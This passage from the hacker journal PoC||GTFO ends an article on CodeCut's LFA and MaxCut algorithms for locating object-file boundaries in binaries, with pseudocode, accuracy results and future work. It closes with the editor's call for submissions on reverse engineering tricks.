d o _ c u t t i n g ( c u t _ a d d r e s s +1 , end , subgraph ( graph , c u t _ a d d r e s s +1 , end ) )
else :
22
p r i n t " O b j e c t boundary from " s t a r t " t o " end
24 main :
s t a r t = binary s t a r t address
26
end = b i n a r y end a d d r e s s
graph = graph o f b i n a r y ( f u n c t i o n s a r e nodes ,
28
d o _ c u t t i n g ( s t a r t , end , graph )
c a l l s are edges )
Figure 4. Pseudocode of the Maximum Cut Object Segmentation Algorithm
77Name/operating system (architecture)
Gnuchess (x86)
PX4 Firmware/Nuttx (ARM)
GoodFET41 Firmware (msp430)
Tmote Sky Firmware/Contiki (msp430)
NXP HTTPD Demo/FreeRTOS (ARM)
Match, %
92.8
98.9
97.0
89.6
94.8
Underlap, %
7.2
1.1
3.0
10.4
5.2
Figure 5. MaxCut results to date.
Related Work Future Work
Much of the related work in this area involves locat-
ing objects or object boundaries in C++ code, using
either static analysis, 46 47 or sometimes a combined
static and dynamic analysis approach. 48 This work
is purely based on static analysis and will work on
C or C++ code, it does not use C++ features like
run-time type information (RTTI). It makes use of
the idea that linkers usually concatenate object files
that they receive as input into the output binary.
Some work exists in generating design diagrams
(e.g. UML) from source code. 49 50 This work shows
generating design diagrams directly from binaries by
first locating object file boundaries. It also presents
a metric for measuring the effectiveness of future so-
lutions to the problem of locating object file bound-
aries is presented. The possibilities for experimentation here are end-
less, and much of my motivation to publish this
work is to get others to play around with LFA and
Max Cut and brainstorm new possible ways to solve
the problem. Thank you to everyone I have brain-
stormed ideas with.
First off, for LFA I am not convinced that taking
the logarithm of distance is the best way to score. I
believe using the inverse square of distance would be
a little too drastic, but this could use some experi-
mentation. An area for improvement is the “thresh-
old” as a placeholder for removing external func-
tions. A simple experiment might be to vary the
threshold and run LFA on the data set, looking for
the best result. Another area for improvement is
edge detection. One possibility would be to gener-
ate the LFA curve for a variety of object files from
data sets, and then generate a characteristic LFA
curve. This characteristic curve could be convolved
with the LFA signal or could be used with a dynamic
threshold approach (i.e., the “external” threshold is
varied until the signal best matches the characteris-
tic curve).
For Max Cut, some development needs to hap-
pen to allow it to produce output matching LFA’s
output, and then it can be tested on the current
dataset.
I envision LFA/Max Cut as one day being a piece
of a multilayered, deep learning system for trans-
lating binary code into natural language automated
static reverse engineering. The LFA source code for
this article is available attached to this PDF and
through Github. 51
48 Tonella, Paolo, and Alessandra Potrich. “Static and dynamic C++ code analysis for the recovery of the object diagram.”
ICSM. IEEE, 2002.
49 Tonella, Paolo, and Alessandra Potrich. “Reverse engineering of the interaction diagrams from C++ code.” Software
Maintenance, 2003. ICSM 2003. IEEE, 2003.
50 Sutton, Andrew, and Jonathan I. Maletic. “Mappings for accurately reverse engineering UML class models from C++.”
Reverse Engineering, 12th Working Conference on. IEEE, 2005.
51 git clone https://github.com/JHUAPL/CodeCut || unzip pocorgtfo20.pdf CodeCut.zip
787920:11
What clever things have you learned lately?
from the desk of Pastor Manul Laphroaig,
Tract Association of PoCGTFO.
Dearest neighbor,
Our scruffy little gang started this самиздат
journal a few years back because we didn’t much like
the academic ones, but also because we wanted to
learn new tricks for reverse engineering. We wanted
to publish the methods that make exploits and poly-
glots possible, so that folks could learn from each
other. Over the years, we’ve been blessed with the
privilege of editing these tricks, of seeing them early,
and of seeing them through to print.
So today, in that spirit of exploration and won-
der, I pass around the collection plate and ask you,
not for paper money or pocket change, but for ex-
planations of nifty projects and the clever tricks that
make them possible.
Teach me how to dump and reverse engineer the
firmware from my credit card, or how to make a file
that is at once a thousand different formats. Show
me how to program the SuperFX coprocessor from
StarFox, or how to design an adapter that makes
the cartridge compatible with a Game Genie.
Give me source code for the software, and give
me schematics for the hardware, but most of all
teach me how to build these things myself. Teach me
to know the difference between those things that are
really hard, and those things that only look intimi-
dating before a bit of practice and the right advice
collapse the problem into something a clever child
might solve.
Give me these tricks and techniques in an ASCII
textfile, or UTF-8 if your language insists, and in-
clude high resolution figures as separate PNG or
PDF files as an email to pastor@phrack.org. My
gang and I will clean it up, typeset it in TEX, in-
dex it and print it for the world. We’ll happily
translate from French, Spanish, Portuguese, Ger-
man, Russian, Hungarian, Hebrew, Serbo-Croation,
and Southern Appalachian.
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, T G S B
80